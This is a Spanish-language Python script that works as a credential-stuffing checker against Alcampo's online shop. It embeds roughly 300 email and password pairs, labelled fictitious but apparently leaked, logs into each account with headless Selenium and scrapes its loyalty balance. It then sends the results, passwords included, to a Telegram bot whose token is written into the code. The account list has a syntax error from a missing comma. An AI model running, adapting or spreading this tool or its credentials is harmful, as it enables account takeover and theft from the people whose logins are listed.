import sys
sys.stdout.reconfigure(encoding='utf-8')
sys.stderr.reconfigure(encoding='utf-8')
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
import pandas as pd
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from webdriver_manager.chrome import ChromeDriverManager # Import ChromeDriverManager

# Install ChromeDriver using webdriver_manager once to ensure compatibility
try:
    CHROME_DRIVER_PATH = ChromeDriverManager().install()
    print(f"ChromeDriver installed by webdriver_manager at: {CHROME_DRIVER_PATH}")
except Exception as e:
    print(f"Error installing ChromeDriver with webdriver_manager: {e}")
    # Fallback to the system-wide installed chromedriver if manager fails
    CHROME_DRIVER_PATH = "/usr/bin/chromedriver"
    print(f"Falling back to system-wide ChromeDriver at: {CHROME_DRIVER_PATH}")

# =======================
# CUENTAS DE ALCAMPO (FICTICIAS)
# =======================
ACCOUNTS = [
    {"email": "leguardeno@gmail.com", "password": "Guardeno1"},
    {"email": "biljos56@gmail.com", "password": "Ainasio56"},
    {"email": "ikergolan@gmail.com", "password": "Melasuda1"},
    {"email": "madjoge@hotmail.com", "password": "Amelie1723!!"},
    {"email": "serginely@yahoo.es", "password": "Sapastra1304"},
    {"email": "marina_guna@hotmail.com", "password": "Serenata24"},
    {"email": "beleng222@hotmail.com", "password": "Gonzalezjorge84"},
    {"email": "impervalle@hotmail.com", "password": "Alejandro1716"},
    {"email": "paboncreaciones39@gmail.com", "password": "Rubiaaaa5"},
    {"email": "anesther79@hotmail.es", "password": "Llanes79"},
    {"email": "fmvp10@yahoo.es", "password": "Madera1081"},
    {"email": "karl_itos81@yahoo.com", "password": "21Barrandeguy"},
    {"email": "guimaguary@gmail.com", "password": "Isa260108"},
    {"email": "ibarasen@euskalnet.net", "password": "Chipiron1*"},
    {"email": "anadelasheras9@gmail.com", "password": "Santi123"},
    {"email": "Ramonmh64@gmail.com", "password": "Enjar@1964"},
    {"email": "inma.moya.gomez@gmail.com", "password": "Abc-123-midori"},
    {"email": "fpquintela@gmail.com", "password": "e)4mttNa"},
    {"email": "red8404@hotmail.com", "password": "xiste1963@"},
    {"email": "alba_ochoa_93@hotmail.com", "password": "Infantas1"},
    {"email": "davidlopezcogolludo@gmail.com", "password": "Lucia@15"},
    {"email": "sara.r.torrecilla@gmail.com", "password": "Nube2020*"},
    {"email": "j.paez.canarias@gmail.com", "password": "tibinouche3A"},
    {"email": "fgvcia2@yahoo.es", "password": "Ferran789"},
    {"email": "jesusgilvara@gmail.com", "password": "Jesus260583"},
    {"email": "dmosquera@gmx.com", "password": "Bender22"},
    {"email": "miangarcia.mg@gmail.com", "password": "1003Micky1977"},
    {"email": "tagilitana25@gmail.com", "password": "Cecilia.2010"},
    {"email": "jpurbenmateo@gmail.com", "password": "Abmm1294"},
    {"email": "javincha007@gmail.com", "password": "Barcelona1"},
    {"email": "davidbendicho@hotmail.com", "password": "Michifu5036"},
    {"email": "anabel_vila@yahoo.es", "password": "Anabel1980"},
    {"email": "ykravtseva@yahoo.es", "password": "Ksenia123"},
    {"email": "humberto_9888@hotmail.es", "password": "Lampard8"},
    {"email": "candelster@gmail.com", "password": "project@1"},
    {"email": "1244440@gmail.com", "password": "Re1244440"},
    {"email": "aaron.5@hotmail.es", "password": "Aitana20"},
    {"email": "aaroncortes23@hotmail.com", "password": "Neizan2017"},
    {"email": "acmorali@hotmail.com", "password": "Oriente59"},
    {"email": "agueferradas@gmail.com", "password": "Chapela231090"},
    {"email": "alarrea@ymail.com", "password": "mc0030FJX"},
    {"email": "antoniorodriguezsoy@gmail.com", "password": "Aa25332533"},
    {"email": "argaglass@hotmail.es", "password": "Almeria2017"},
    {"email": "ayaleta81@hotmail.com", "password": "Dragonball1981@"},
    {"email": "breiner90@hotmail.es", "password": "Colombia15"},
    {"email": "cap1ariza@gmail.com", "password": "Hippiebooh_18"},
    {"email": "corisco31@hotmail.com", "password": "29Poljas"},
    {"email": "deianjoi23105@gmail.com", "password": "PekeFly23"},
    {"email": "espinosillo61@gmail.com", "password": "licodia206@"},
    {"email": "gabrielanoemi33@gmail.com", "password": "*Coyagot6"},
    {"email": "guillermo@qualityservice.es", "password": "0437efbGHM"},
    {"email": "javilechuga2@hotmail.com", "password": "Toledo20"},
    {"email": "jm_giltoural@yahoo.es", "password": "Startrek1"},
    {"email": "josemaborrero@hotmail.com", "password": "Granita7"},
    {"email": "juliarodriguezmerino@hotmail.com", "password": "Lun@221071"},
    {"email": "kibele_bcn@hotmail.com", "password": "639081773Ww"},
    {"email": "kikorc@gmail.com", "password": "X3008n1012!"},
    {"email": "KURKOZ@GMAIL.COM", "password": "Aa@11071976"},
    {"email": "LLORAT666@GMAIL.COM", "password": "Alma180305"},
    {"email": "llorat666@gmail.com", "password": "Alma180305"},
    {"email": "martinszalas@yahoo.com", "password": "Maxdemage1989"},
    {"email": "montajesparques@gmail.com", "password": "Braulio70"},
    {"email": "munt4@yahoo.es", "password": "Tenerife25"},
    {"email": "mvinaras@hotmail.com", "password": "Todosjuntos3"},
    {"email": "nelsonleyva005@gmail.com", "password": "48771613kK"},
    {"email": "oomaf2@gmail.com", "password": "24Marzo00oomaf"},
    {"email": "oscar.alcolea@gmail.com", "password": "Mi2Apellid0"},
    {"email": "pilar.pitarch@hotmail.es", "password": "Mecano1969"},
    {"email": "ro.carou@gmail.com", "password": "Deneb.1978"},
    {"email": "rutinieto@gmail.com", "password": "Ruth10037500xq"},
    {"email": "shibo.156@gmail.com", "password": "Nereinha1992"},
    {"email": "spanishlord1@yahoo.es", "password": "Moncho@1961"},
    {"email": "stanciueduard2005@yahoo.com", "password": "EDI8702hbl"},
    {"email": "susanagallur@yahoo.es", "password": "Susana76"},
    {"email": "teresinia@hotmail.com", "password": "Irene2013"},
    {"email": "verocipi9@hotmail.com", "password": "Siempre9"},
    {"email": "XPFOXITOS@YAHOO.ES", "password": "eSales12_A"},
    {"email": "cornejo.irene2@gmail.com", "password": "Irene1906@"},
    {"email": "susanasalerosa@gmail.com", "password": "060817jorsuS"},
    {"email": "rodriguezsarai2515101998@gmail.com", "password": "Santamarta1998"},
    {"email": "angelrmr74@gmail.com", "password": "ngl1329R"},
    {"email": "felipequemada@gmail.com", "password": "Quemjor1"},
    {"email": "javiernavarrogri@hotmail.com", "password": "Wjagawja1473"},
    {"email": "noeliabm2000@gmail.com", "password": "Noelitaabm17"},
    {"email": "anaped82@gmail.com", "password": "Alejandro2011"},
    {"email": "chetansanket@hotmail.es", "password": "1Marcelino"},
    {"email": "monica291263@gmail.com", "password": "MonicaVidalBedoya63"},
    {"email": "gemiinavea@gmail.com", "password": "Tochuno70"},
    {"email": "quesadahermosillajuan@gmail.com", "password": "Juanybelen8788"},
    {"email": "besargon@hotmail.com", "password": "Dba24051988"},
    {"email": "patridunk@hotmail.com", "password": "$Casariche2010"},
    {"email": "inmadgt@gmail.com", "password": "Iqcg1210"},
    {"email": "soniagb72@hotmail.com", "password": "Po3990bs"},
    {"email": "silver310814@gmail.com", "password": "Compra12345"},
    {"email": "JAVIERNAVARROGRI@HOTMAIL.COM", "password": "Wjagawja1473"},
    {"email": "huevonleon81@gmail.com", "password": "wkqsG_X8Wm6Vb+?"},
    {"email": "ipillo@gmail.com", "password": "Ch235bd1!"},
    {"email": "beamarinho92@gmail.com", "password": "segupa9A!"},
    {"email": "alba7rose@gmail.com", "password": "697PituyAlba131"},
    {"email": "joaquin@suarez-puerta.com", "password": "Ja234872"},
    {"email": "cristinadelrio71@gmail.com", "password": "Cristina71"},
    {"email": "estefan_cn@hotmail.com", "password": "Wapetona1982"},
    {"email": "mixolas@gmail.com", "password": "Lamela526352."},
    {"email": "maikamarracoi@gmail.com", "password": "Maikita2342"},
    {"email": "ninopeva@gmail.com", "password": "Pakito1390"},
    {"email": "dcchust@gmail.com", "password": "Exceso1982"},
    {"email": "Jonathancortes1655@gmail.com", "password": "Samira2718"},
    {"email": "aleyreques@gmail.com", "password": "Treblaxela22"},
    {"email": "merche-1975@hotmail.es", "password": "Merediz1975"},
    {"email": "FJJULIANV@GMAIL.COM", "password": "Lydia030601"},
    {"email": "jesus.martin.gonzalez@gmail.com", "password": "SaraLixi_061106"},
    {"email": "marievelasco@msn.com", "password": "Marie1424"},
    {"email": "MIRIAMVALLES91@HOTMAIL.COM", "password": "Alcampo17.84"},
    {"email": "anainesvico@hotmail.com", "password": "Av637181887"},
    {"email": "princesita.loly@hotmail.es", "password": "Loly1971"},
    {"email": "RAULKOYT@GMAIL.COM", "password": "a2D1FD34"},
    {"email": "ibanssv@gmail.com", "password": "ThrombociD33"},
    {"email": "jdgalisteo@gmail.com", "password": "juandi@64"},
    {"email": "arm.monavie@hotmail.com", "password": "Sonia1978_"},
    {"email": "robertoescribano6@gmail.com", "password": "Roesmo1961+"},
    {"email": "nicolas.gerenstein@gmail.com", "password": "Getu123x123x"},
    {"email": "litelopez@gmail.com", "password": "Vivatunita1"},
    {"email": "elmisteriso55@yahoo.es", "password": "Powerrangers12"},
    {"email": "emanuelrazvan16@gmail.com", "password": "Rokanrol123"},
    {"email":"elatepes@yahoo.es","password":"2005Noemi"},
    {"email":"mariavizap@hotmail.com","password":"Dobby230398"},
    {"email":"rguezvelasco@gmail.com","password":"190813LUna"},
    {"email":"andreadelaplaza1996@gmail.com","password":"665819701aAa"},
    {"email":"thomas.ls@outlook.com","password":"1579_Abe"},
    {"email":"mascosramirez@gmail.com","password":"Alejandro1"},
    {"email":"mrymspilar@yahoo.es","password":"Estrella69*"},
    {"email":"franciscopons91@gmail.com","password":"Hugo2010"},
    {"email":"mcrespo_e@hotmail.com","password":"Sierrav7"},
    {"email":"bydani3003@gmail.com","password":"7100Nina"},
    {"email":"yhernandezr@gmail.com","password":"Luciaesteban2008*"},
    {"email":"jluiscr@msn.com","password":"Valdemoro1"},
    {"email":"irenesampedrososa@gmail.com","password":"Monica17"},
    {"email":"med.elgholb@gmail.com","password":"Mohamed1989"},
    {"email":"raquel260786@hotmail.es","password":"RAalFE260786"},
    {"email":"familiagh09@gmail.com","password":"8907/dyd"},
    {"email":"carloscontador0812@gmail.com","password":"Cpjg19030892"},
    {"email":"nohalesromn@gmail.com","password":"Alej2001"},
    {"email":"jcgg00036@gmail.com","password":"Tani3550"},
    {"email":"sergiobernalbernal@yahoo.es","password":"Rachma74"},
    {"email":"isabelvegalopez@yahoo.es","password":"Ainara2011"},
    {"email":"jrbalaguer@gmail.com","password":"Nosferatu1"},
    {"email":"jone_mu@hotmail.com","password":"Jone1984"},
    {"email":"espiril@aol.es","password":"Delvisa1"},
    {"email":"mariarustarazo@gmail.com","password":"mamama90!?"},
    {"email":"rabivi@hotmail.com","password":"Rr41000999"},
    {"email":"elenahj@hotmail.es","password":"Vacaciones.2020"},
    {"email":"joaquinpm19@hotmail.com","password":"Polako19"},
    {"email":"jomaroga@gmail.com","password":"Cris1997"},
    {"email":"jrmerino@gruposigloxxi.es","password":"Eusaalramica47"},
    {"email":"giopu2002@hotmail.com","password":"Diego8292"},
    {"email":"carlos20885303@gmail.com","password":"Carlos20885303."},
    {"email":"esme_982@hotmail.com","password":"Aitana20"},
    {"email":"lucia.peiteado@gmail.com","password":"pEItEAd0"},
    {"email":"tomasynadamas@gmail.com","password":"12.Tomaxx"},
    {"email":"antonio.lopez.suarez@gmail.com","password":"Bebegochy2023"},
    {"email":"angsanper@yahoo.es","password":"cacharrEro1969"},
    {"email":"raul.closa@hotmail.es","password":"Aitana@4"},
    {"email":"meritxell10@hotmail.es","password":"Caramelo12"},
    {"email":"nmosteo@gmail.com","password":"yggq5eSxjqCxy!p"},
    {"email":"mirceanadia@gmail.com","password":"2323232323Ares"},
    {"email":"pablodiazsebastian2004@gmail.com","password":"Jad27a@72"},
    {"email":"rubensbau@hotmail.com","password":"@Cagontos1978"},
    {"email":"cecidiaz1403@gmail.com","password":"Qzp4BuVf"},
    {"email":"pasuso@hotmail.es","password":"Ginebra7"},
    {"email":"jose.luis.pereira.02@hotmail.com","password":"Pereira02"},
    {"email":"dobleenvi11@gmail.com","password":"Retroceso.11"},
    {"email":"basurajoseluis@gmail.com","password":"44076082Dd"},
    {"email":"alemaje@hotmail.com","password":"Ma061264je"},
    {"email":"c-comer@hotmail.es","password":"Mallorca10"},
    {"email":"ultra.rafa@hotmail.es","password":"Chispayflhoo1000"},
    {"email":"mccachoc@hotmail.es","password":"Agreda1971"},
    {"email":"susdelamata@yahoo.es","password":"Susana71"},
    {"email":"salasvmc@hotmail.es","password":"Yoigo123"},
    {"email":"ponferrosa2000@yahoo.es","password":"Brujaluisa2015"},
    {"email":"rich17@hotmail.es","password":"Richardson3117"},
    {"email":"jerezano_86@outlook.es","password":"Juane1986"},
    {"email":"nico.augus@hotmail.es","password":"Doni2008"},
    {"email":"aroac.garcia@hotmail.es","password":"Fauna1993"},
    {"email":"patry_ai_8@hotmail.es","password":"Lokaloka8"},
    {"email":"uzmiky@yahoo.es","password":"Figueres11"},
    {"email":"mmiravalles@hotmail.es","password":"20Judith02"},
    {"email":"isafuepa@hotmail.es","password":"Sergio1Raul2"},
    {"email":"jorge_zey@yahoo.es","password":"chocolat1E"},
    {"email":"raziel86@hotmail.es","password":"al15Fa64"},
    {"email":"taniasuerocontreras@outlook.es","password":"Caramelito35"},
    {"email":"ruben.frias@hotmail.es","password":"Morenaza1"},
    {"email":"javibego-724@hotmail.es","password":"Begotxu1971"},
    {"email":"mercyjj@hotmail.es","password":"17Febrero1979!"},
    {"email":"info@rispoli.es","password":"Diego1976!"},
    {"email":"dbuendia@ugr.es","password":"Hugo2008"},
    {"email":"patri_sh@hotmail.es","password":"Paty8692"},
    {"email":"anamaria.hututuc@gmail.com","password":"Anamaria1997"},
    {"email":"marinarb03@gmail.com","password":"Marina2003"},
    {"email":"shros22@hotmail.com","password":"Touran110206!"},
    {"email":"jhonher197@gmail.com","password":"G.15Publicista"},
    {"email":"dulcineacdz@gmail.com","password":"Amelie2603"},
    {"email":"totyanedu@hotmail.com","password":"Toty761976@"},
    {"email":"shahidi.koosha@gmail.com","password":"Kankash1368*"},
    {"email":"pc-carmona1@hotmail.es","password":"Clara123"},
    {"email":"pinkismael@gmail.com","password":"Isma2002"},
    {"email":"andres-salin@hotmail.com","password":"A02030203a"},
    {"email":"lulu.ka87@hotmail.es","password":"24Enero1987"},
    {"email":"mai39_calero@hotmail.es","password":"Las3marias"},
    {"email":"jesusmv2004@yahoo.es","password":"Jesus100"},
    {"email":"rdpt2009@hotmail.es","password":"Daniel00"},
    {"email":"mlgarcia9999@yahoo.es","password":"Psicologia9999"},
    {"email":"macu_1128@hotmail.es","password":"Ramos1128"},
    {"email":"gconstanbulnes@yahoo.es","password":"Jabali23"},
    {"email":"enriquecano65@yahoo.es","password":"Benito01"},
    {"email":"ngarciagracia@yahoo.es","password":"Cachis123"}
     {"email":"piluca2009@hotmail.es","password":"Piluky65"},
  {"email":"sradesilva@yahoo.es","password":"Ps190506"},
  {"email":"humberto_9888@hotmail.es","password":"Lampard8"},
  {"email":"evagabar@hotmail.es","password":"India1984"},
  {"email":"aliciaznar@yahoo.es","password":"Reinica16"},
  {"email":"sosule2002@yahoo.es","password":"Aa667800"},
  {"email":"albaariasconde@hotmail.es","password":"19Alba89"},
  {"email":"avix@movistar.es","password":"Teresa01"},
  {"email":"piliybernardo@hotmail.es","password":"Andrea2005"},
  {"email":"ellobregatmarse@yahoo.es","password":"Bilal2008"},
  {"email":"noeliavicario@hotmail.es","password":"Iloveme90!"},
  {"email":"xanpaula@yahoo.es","password":"Pirucho1"},
  {"email":"yo.yesi@hotmail.es","password":"Anguelf0"},
  {"email":"josecalvo1989@hotmail.com","password":"250715Matias"},
  {"email":"annapar@hotmail.es","password":"Sevilla2006"},
  {"email":"christianuclespledger@gmail.com","password":"Chris10071985"},
  {"email":"pigomu1973@yahoo.es","password":"Jarandilla01"},
  {"email":"neus_1987@hotmail.es","password":"Nacien1987"},
  {"email":"laura_cm1@hotmail.es","password":"Bigotes1"},
  {"email":"aliciavallssalas@yahoo.es","password":"Cacadevaca21"},
  {"email":"heras_laura@yahoo.es","password":"Lauris1986"},
  {"email":"sportelarojo@yahoo.es","password":"Cabral10"},
  {"email":"doradonogales@yahoo.es","password":"Paolita2000"},
  {"email":"celiacolmenar@yahoo.es","password":"Celia007"},
  {"email":"victoria.yaser.1@gmail.com","password":"Yaser-113"},
  {"email":"barcia38@gmail.com","password":"44806792Dd"},
  {"email":"josebe31@yahoo.es","password":"Labiano31"},
  {"email":"estepc2001@gmail.com","password":"TysonLua20"},
  {"email":"cleogutierrezmartin@gmail.com","password":"Pekeizan23"},
  {"email":"roxy_iviasa@yahoo.es","password":"Alejandro@@2007"},
  {"email":"malak2012343@gmail.com","password":"AFamj1946"},
  {"email":"zapatafernandezc@yahoo.es","password":"Gabriela1501"},
  {"email":"velezzapatam@yahoo.es","password":"Chipotle33"},
  {"email":"j_nunez_pena@yahoo.es","password":"Cabra1973"},
  {"email":"sarahbaes@yahoo.es","password":"Sarahbaes22"},
  {"email":"laldeana@yahoo.es","password":"RisitaS1971"},
  {"email":"vanessa.alvarez70@yahoo.es","password":"Vanessa109747"},
  {"email":"chemasa@yahoo.es","password":"123456As"},
  {"email":"rociozaragoza_73@hotmail.es","password":"Arizaida2"},
  {"email":"fervios@yahoo.es","password":"008366Dfc"},
  {"email":"jposadasramos@gmail.com","password":"Posadas101"},
  {"email":"alilobatosantos@yahoo.es","password":"335990Als"},
  {"email":"estefaniarodo@hotmail.es","password":"26Mayo1992"},
  {"email":"luisfreites.es@gmail.com","password":"Lafu6767088*"},
  {"email":"patrigon9@gmail.com","password":"Pg260575"},
  {"email":"ejaso20@yahoo.es","password":"22Naiara"},
  {"email":"ringochus@yahoo.es","password":"Naia2010"},
  {"email":"margoniz@hotmail.es","password":"Minumeroesel7"},
  {"email":"raquel.roldan.montero@hotmail.es","password":"Raqueta93"},
  {"email":"amaia_hanna@yahoo.es","password":"Guinnes149"},
  {"email":"luciaesca@outlook.es","password":"Lucia17."},
  {"email":"kuroanddisney@gmail.com","password":"Mtrsk5241!"},
  {"email":"lauraialfonso@yahoo.es","password":"Enric02122004"},
  {"email":"soniamiguez77@yahoo.es","password":"Taniaam2005"},
  {"email":"munoz_pilar@yahoo.es","password":"Pms290975"},
  {"email":"enriquemaartin@gmail.com","password":"Cochealos18*"},
  {"email":"rrddtorres@yahoo.es","password":"Robertito7"},
  {"email":"tefemag@yahoo.es","password":"Tere3782"},
  {"email":"sabahkardache10@gmail.com","password":"Lool4cool"},
  {"email":"debo1190@hotmail.es","password":"Debora1982"},
  {"email":"lucyliu39@hotmail.com","password":"Cbypcl9532"},
  {"email":"008angel@hotmail.es","password":"Crespo08"},
  {"email":"jabansola@yahoo.es","password":"Sagasta26"},
  {"email":"nayras@yahoo.es","password":"Sefocuma1"},
  {"email":"chacanana@yahoo.es","password":"cRg@1982"},
  {"email":"isabelfernandezv@yahoo.es","password":"Amadeu29"},
  {"email":"joserb2@yahoo.es","password":"User6911"},
  {"email":"tervichec@hotmail.es","password":"Teresa1977"},
  {"email":"valcalle@yahoo.es","password":"Moratoria112"},
  {"email":"sicomantiss@gmail.com","password":"Aeripont1"},
  {"email":"virtusanchez75@gmail.com","password":"Morricas75"},
  {"email":"bugedoarnauana@gmail.com","password":"Tejona1972"},
  {"email":"rubiom@uji.es","password":"Martamarcos270"},
  {"email":"bmartin14@hotmail.es","password":"Begontxu14"},
  {"email":"rosa.burgos@hotmail.es","password":"Alba1608"},
  {"email":"eloisagarcmont@hotmail.es","password":"Eloisa1812"},
  {"email":"cristinita.92@hotmail.es","password":"Andesteiro22"},
  {"email":"tizucaes@yahoo.es","password":"Piriki1520"},
  {"email":"maipego@yahoo.es","password":"Carrascal8"},
  {"email":"cesarloli@hotmail.es","password":"Cesar2006"},
  {"email":"noemiciruela@hotmail.es","password":"Irati2007"},
  {"email":"pin_pon_74@yahoo.es","password":"Pini2012"},
  {"email":"carmen.nuska@gmail.com","password":"A20041201c"},
  {"email":"lmplaza@gmail.com","password":"Doraimon00"},
  {"email":"lpsaez@yahoo.es","password":"Paco011210"},
  {"email":"masfrio2009@hotmail.es","password":"010197Na"},
  {"email":"tadeva@hotmail.es","password":"Alcala318"},
  {"email":"fromwonderland@hotmail.es","password":"Oo19112011**"},
  {"email":"gonipterus@yahoo.es","password":"Ra240585"},
  {"email":"anbelzunegui@hotmail.es","password":"Cacafuti123520"},
  {"email":"adhemir_napa_21@hotmail.es","password":"Bryan200"},
  {"email":"judithgc78@hotmail.es","password":"Alex2009"},
  {"email":"loscuervastreet@yahoo.es","password":"Lv271011"},
  {"email":"m.marquezruiz@hotmail.es","password":"Lourdes22"},
  {"email":"lolabazarra@yahoo.es","password":"Lola2402"}    
]

# =======================
# TELEGRAM CONFIG
# =======================
TELEGRAM_TOKEN = "8041531688:AAHif8qa9wMZ1EAxU3MrftR-tCrEkQ2dfPU"
CHAT_ID = -5049278431   # Tu chat_id

def enviar_telegram_texto(mensaje):
    """Envía texto por Telegram."""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": mensaje}
    try:
        response = requests.post(url, data=data)
        print(f"📡 Enviando a Telegram: {response.status_code} - {response.text}")
        response.raise_for_status()
    except Exception as e:
        print(f"❌ Error CRÍTICO enviando a Telegram: {e}")

def enviar_telegram_documento(path, caption=""):
    """Envía un archivo por Telegram."""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
    try:
        with open(path, "rb") as file:
            data = {"chat_id": CHAT_ID, "caption": caption}
            response = requests.post(url, data=data, files={"document": file})
            print(f"📁 Enviando documento a Telegram: {response.status_code} - {response.text}")
            response.raise_for_status()
    except Exception as e:
        print(f"❌ Error CRÍTICO enviando documento a Telegram: {e}")

# =======================
# FUNCION PARA PROCESAR CUENTA
# =======================
# Notificar inicio de ejecuciÃ³n
try:
    enviar_telegram_texto("ðŸš€ Iniciando script de Alcampo...")
except Exception as e:
    print(f"Error enviando mensaje de inicio: {e}")

def procesar_cuenta(email, password):
    print(f"\n→→ Procesando cuenta: {email}")
    
    intentos_max = 3
    
    for intento in range(1, intentos_max + 1):
        driver = None
        try:
            if intento > 1:
                print(f"⚠️ Reintentando {email} (Intento {intento}/{intentos_max})...")

            chrome_options = Options()
            chrome_options.add_argument("--headless=new")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            
            # Use the pre-installed chromedriver
            driver = webdriver.Chrome(
                service=Service(CHROME_DRIVER_PATH),
                options=chrome_options
            )

            driver.get("https://www.compraonline.alcampo.es/login?destination=%2F")
            time.sleep(3)

            email_field = driver.find_element(By.ID, "uname1")
            password_field = driver.find_element(By.ID, "pwd1")

            email_field.send_keys(email)
            password_field.send_keys(password)
            password_field.send_keys(Keys.ENTER)
            time.sleep(5)

            driver.get("https://www.compraonline.alcampo.es/settings/loyalty")
            time.sleep(2)
            driver.refresh()
            time.sleep(3)

            saldo = "No encontrado"
            try:
                elemento = driver.find_element(
                    By.XPATH,
                    "/html/body/div[1]/div/div[1]/main/div[2]/div[2]/div/div/span"
                )
                saldo = elemento.text.strip()
            except:
                pass

            print(f"✔ {email} → SALDO: {saldo}")
            return {"email": email, "password": password, "saldo": saldo}

        except Exception as e:
            print(f"❌ Error en {email} (Intento {intento}): {e}")
            if intento == intentos_max:
                return {"email": email, "password": password, "saldo": f"Error: {e}"}
            time.sleep(3) # Esperar antes de reintentar

        finally:
            if driver:
                driver.quit()

# =======================
# EJECUTAR TODO EN PARALELO
# =======================
resultados = []

print("\n🔥 Ejecutando todas las cuentas en paralelo...\n")

with ThreadPoolExecutor(max_workers=5) as executor:
    futures = [executor.submit(procesar_cuenta, acc["email"], acc["password"]) for acc in ACCOUNTS]
    for future in as_completed(futures):
        resultados.append(future.result())

# =======================
# GUARDAR RESULTADOS EN EXCEL
# =======================
df = pd.DataFrame(resultados)
excel_path = "saldos_alcampo.xlsx"
df.to_excel(excel_path, index=False)

print("\n💾 Datos guardados en:", excel_path)

# =======================
# CALCULAR RESUMEN Y ENVIAR
# =======================
def limpiar_saldo(saldo_str):
    """Convierte texto tipo '5,30 €' a float 5.30"""
    try:
        if "Error" in saldo_str or "No encontrado" in saldo_str:
            return 0.0
        # Eliminar símbolo euro, espacios y cambiar coma por punto
        limpio = saldo_str.replace('€', '').replace(' ', '').replace(',', '.').strip()
        return float(limpio)
    except:
        return 0.0

saldo_total = 0.0
cuenta_top = {"email": "N/A", "saldo_val": 0.0}
cuentas_con_saldo = 0

for r in resultados:
    valor = limpiar_saldo(r["saldo"])
    saldo_total += valor
    if valor > 0:
        cuentas_con_saldo += 1
    if valor > cuenta_top["saldo_val"]:
        cuenta_top = {"email": r["email"], "saldo_val": valor}

mensaje_resumen = (
    f"📊 **RESUMEN ALCAMPO**\n\n"
    f"✅ Cuentas procesadas: {len(resultados)}\n"
    f"💰 **Saldo Total:** {saldo_total:.2f} €\n"
    f"💎 Cuentas con dinero: {cuentas_con_saldo}\n"
    f"🏆 **Top Cuenta:** {cuenta_top['email']} ({cuenta_top['saldo_val']:.2f} €)"
)

print("\n" + mensaje_resumen)
enviar_telegram_texto(mensaje_resumen)

# =======================
# ENVIAR UN SOLO MENSAJE CON EL EXCEL
# =======================
enviar_telegram_documento(
    excel_path,
    caption="📊 Reporte de saldos de cuentas Alcampo"
)

print("🎉 PROCESO COMPLETO Y ENVIADO A TELEGRAM\n")
